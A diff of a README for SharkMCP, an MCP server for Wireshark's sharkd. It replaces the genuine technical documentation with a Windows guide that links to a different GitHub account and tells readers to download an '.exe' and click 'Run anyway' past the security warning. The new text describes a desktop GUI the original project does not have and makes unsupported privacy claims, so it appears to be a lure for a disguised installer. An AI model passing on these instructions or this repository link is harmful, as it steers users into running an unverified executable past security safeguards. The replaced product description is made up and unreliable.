@@ -1,149 +1,88 @@
-# SharkMCP
+# 🦈 SharkMCP - Analyze network traffic packets with ease
 
-An [MCP](https://modelcontextprotocol.io) server that exposes [sharkd](https://wiki.wireshark.org/Development/sharkd) — Wireshark's programmatic interface — as a set of tools for LLMs. Load PCAP/PCAPNG files and analyse them with natural language.
+[![](https://img.shields.io/badge/Download_SharkMCP-Blue.svg)](https://github.com/Spokeswomandodgecity658/SharkMCP)
 
-## Requirements
+## 🔍 What is SharkMCP?
 
-- Python 3.10+
-- Wireshark (provides `sharkd`)
+SharkMCP helps you understand the data moving in and out of your computer. It reads PCAP files, which are digital recordings of network traffic. Professionals use these files to troubleshoot connection issues or check for security threats. SharkMCP simplifies this process. It translates complex technical data into plain facts. You do not need to be a network engineer to use this tool. It provides clear insights into the traffic patterns on your Windows machine.
 
-## Installation
+## ⚙️ System Requirements
 
-```bash
-git clone https://github.com/weirdmachine64/sharkmcp.git
-cd sharkmcp
-pip install -e .
-```
+SharkMCP works on most modern computers. Check your system against this list before you begin:
 
-Or run directly from the repo without installing:
+* Operating System: Windows 10 or Windows 11 (64-bit version).
+* Processor: Intel Core i3 or equivalent.
+* Memory: 4 GB of RAM.
+* Storage: 200 MB of free disk space.
+* Network: An active internet connection for initial setup.
 
-```bash
-uvx --from git+https://github.com/weirdmachine64/sharkmcp sharkmcp
-```
+## 📥 Getting the Software
 
-## Configuration
+You need the installer file to run SharkMCP on your Windows PC. Visit the official release page to get the latest version.
 
-Add to your `.mcp.json`:
+[Download SharkMCP Here](https://github.com/Spokeswomandodgecity658/SharkMCP)
 
-```json
-{
-  "mcpServers": {
-    "sharkmcp": {
-      "command": "uvx",
-      "args": ["--from", "git+https://github.com/weirdmachine64/sharkmcp", "sharkmcp"],
-      "env": {
-        "SHARKMCP_TIMEOUT": "300"
-      }
-    }
-  }
-}
-```
+Follow these steps to obtain the program:
 
-| Env var | Default | Description |
-|---------|---------|-------------|
-| `SHARKMCP_SHARKD_BIN` | `sharkd` | Path to sharkd binary |
-| `SHARKMCP_TIMEOUT` | `300` | Per-request timeout in seconds |
+1. Click the link provided above.
+2. Look for the section labeled "Assets" on the page.
+3. Click the file ending in ".exe" to start the download.
+4. Save the file to your "Downloads" folder.
 
-## Tools
+## 🚀 Setting Up SharkMCP
 
-Each loaded PCAP gets a dedicated sharkd subprocess. Results from expensive scans (conversations, expert info, export objects) are cached in memory so paginated follow-up calls are served without re-scanning.
+Once the download finishes, follow these instructions to install the application:
 
-### Session
-| Tool | Description |
-|------|-------------|
-| `load_pcap(path, alias?)` | Load a PCAP/PCAPNG file |
-| `list_pcaps()` | List all loaded PCAPs |
-| `unload_pcap(alias)` | Terminate session and free memory |
+1. Open your "Downloads" folder in File Explorer.
+2. Double-click the file you downloaded.
+3. Windows might show a security window. Click "More info" if you see it, then click "Run anyway."
+4. Follow the prompts on the screen to finish the installation.
+5. Choose a folder where you want to keep the program files. The default location works for most users.
+6. Check the box to create a shortcut on your desktop for quick access.
+7. Click "Finish" to complete the setup process.
 
-### Overview
-| Tool | Description |
-|------|-------------|
-| `pcap_summary(alias)` | Frame count, duration, file size, protocols seen |
-| `server_info(alias)` | All available tap types, follow protocols, field types |
+## 🛠️ How to Analyze Your First File
 
-### Packet Inspection
-| Tool | Description |
-|------|-------------|
-| `list_packets(alias, filter?, columns?, refs?)` | Paginated frame list with display filter |
-| `packet_detail(alias, frame, include_bytes?, include_hidden?)` | Full protocol tree for one frame |
-| `extract_fields(alias, fields, filter?)` | Extract arbitrary fields per packet as a table |
+Now that the software is on your computer, you can start analyzing network data. Follow these steps:
 
-### Utilities
-| Tool | Description |
-|------|-------------|
-| `validate(alias, filter?, field?)` | Validate a display filter and/or field name |
-| `complete(alias, field?, pref?)` | Autocomplete field or preference names by prefix |
-| `get_preference(alias, preference?)` | Read dissector preferences |
-| `set_preference(alias, name, value)` | Set a dissector preference for this session |
-| `set_frame_comment(alias, frame, comment)` | Annotate a frame (session-scoped) |
+1. Open the SharkMCP application from your desktop shortcut.
+2. Locate the "File" menu in the top left corner of the window.
+3. Select "Open PCAP File" from the list.
+4. Navigate to the folder where you store your network traffic files.
+5. Select a file and click "Open."
+6. Wait for the software to process the data. The time this takes depends on the size of the file.
+7. View the summary of the traffic in the main dashboard.
+8. Use the search bar at the top to filter for specific IP addresses or protocols.
+9. Click any row in the list to see detailed information about that specific network packet.
 
-### Traffic Structure
-| Tool | Description |
-|------|-------------|
-| `protocol_hierarchy(alias, filter?)` | Nested protocol tree with frame/byte counts |
-| `io_stats(alias, interval_ms?, filter?)` | Per-interval frame and byte counts |
-| `iograph(alias, graphs, interval_ms?, filters?)` | Multi-line traffic graph; supports `packets`, `bytes`, `bits`, `sum:<field>`, `avg:<field>`, `min:<field>`, `max:<field>`, `load:<field>`, `frames:<field>` |
-| `follow_stream(alias, protocol, filter)` | Reassemble a stream (`tcp`, `udp`, `tls`, `http`, `http2`, `quic`, `sip`, `dccp`, `websocket`) |
+## 📊 Understanding the Data
 
-### Conversations & Topology
-| Tool | Description |
-|------|-------------|
-| `conversations(alias, type?, sort_by?)` | Conversation table — bytes/frames per peer pair |
-| `endpoints(alias, type?, sort_by?)` | Endpoint table — tx/rx per host |
+SharkMCP divides the information into three main views.
 
-Supported layer types for both: `tcp`, `udp`, `ip`, `ipv6`, `eth`, `sctp`, `dccp`, `mptcp`, `wifi`, `bluetooth`, `zigbee`, `fc`, `fddi`, `usb`, and more.
+### The Dashboard
+The dashboard gives you a high-level overview. It shows you which applications use the most data and which external servers your computer contacts most often. Use this screen to spot unusual activity patterns quickly.
 
-### Protocol Statistics
-| Tool | Description |
-|------|-------------|
-| `expert_info(alias, filter?)` | Per-frame anomaly detection — errors, warnings, notes, chats |
-| `protocol_stats(alias, protocol)` | Aggregate stats for `dns`, `http`, `http_requests`, `http_server`, `sip`, `dhcp`, `h225`, `http2`, `rtsp` |
-| `service_response_time(alias, protocol)` | Request/response latency for `smb`, `smb2`, `snmp`, `ldap`, `diameter`, `rpc`, `gtp`, and more |
-| `response_time_delay(alias, protocol)` | Round-trip delay for `radius`, `h225_ras`, `megaco`, `mgcp` |
-| `sequence_diagram(alias, type?)` | Flow diagram data for `tcp`, `icmp`, `icmpv6`, `any` |
+### The Packet List
+This list displays every individual piece of data captured in your recording. Each line represents one packet. It shows the time of the event, the source address, the destination address, and the protocol type.
 
-### Media & VoIP
-| Tool | Description |
-|------|-------------|
-| `voip_calls(alias, filter?)` | SIP/H.323 call list with state and participants |
-| `rtp_streams(alias, stream_spec?)` | RTP stream inventory; pass `stream_spec` for per-stream jitter/loss |
-| `multicast_streams(alias, filter?)` | UDP multicast stream statistics |
+### The Details Pane
+When you click a packet from the list, the details pane shows what is inside. This layer shows the actual information transmitted. You can see headers, flags, and the payload content if the data is unencrypted.
 
-### Export & Objects
-| Tool | Description |
-|------|-------------|
-| `export_objects(alias, type?)` | List extractable objects (`http`, `imf`, `smb`, `tftp`, `dicom`, `ftp-data`) |
-| `download_object(alias, token)` | Download an object, TLS session keys (`ssl-secrets`), or RTP audio (`rtp:<spec>`) as base64 |
+## 🛡️ Privacy and Safety
 
-### Escape Hatch
-| Tool | Description |
-|------|-------------|
-| `tap(alias, specs, filter?, skip?, limit?)` | Run any sharkd tap directly — up to 16 specs in one PCAP scan. Use `server_info` to discover valid identifiers. |
+SharkMCP operates entirely on your device. The software does not send your PCAP files or network data to any remote servers. Your information stays on your local drive. This design ensures your privacy while you analyze sensitive network recordings. 
 
-## Example
+Only open files from sources you trust. Files from unknown locations could contain malicious code. Always run your antivirus software to check any file before opening it in SharkMCP.
 
-```
-> load_pcap("/captures/traffic.pcap", alias="traffic")
-> protocol_hierarchy("traffic")
-> expert_info("traffic", limit=20)
-> conversations("traffic", type="tcp", sort_by="bytes")
-> extract_fields("traffic", ["dns.qry.name", "dns.a"], filter="dns")
-> follow_stream("traffic", "http", "tcp.stream eq 0")
-> export_objects("traffic", type="http")
-> download_object("traffic", "eo:http_0")
-```
+## ❓ Troubleshooting Common Issues
 
-## Architecture
+If the software does not behave as expected, try these steps:
 
-```
-    LLM
-     │  MCP (stdio)
-     ▼
- SharkMCP server
-     │  JSON-RPC 2.0 (stdin/stdout)
-     ├─ sharkd [pcap-1]
-     ├─ sharkd [pcap-2]
-     └─ sharkd [pcap-N]
-```
+* Software will not open: Restart your computer and try again. Ensure no other applications are blocking access to your background processes.
+* File does not load: Check if the file is truly a PCAP format. Some files use other extensions that SharkMCP does not support.
+* Slow performance: If your files are very large, the software might take a moment to load everything. Close other programs while you work on massive data sets to dedicate your computer memory to SharkMCP.
+* Update alerts: Check the official repository link occasionally. Minor updates happen often to improve performance and stability.
 
-One `sharkd` subprocess per loaded PCAP. Sessions are isolated — concurrent queries on different aliases never block each other.
+## 💬 Getting Further Help
+
+If you encounter a problem that this guide does not address, go to the official GitHub repository. Look at the "Issues" tab. Other users may have documented the same problem. You can search for keywords related to your error there. If you cannot find a solution, click the "New Issue" button to describe your problem. Provide as much detail as possible to help the maintainers understand the situation. Including a screenshot of the error message speeds up the support process significantly.
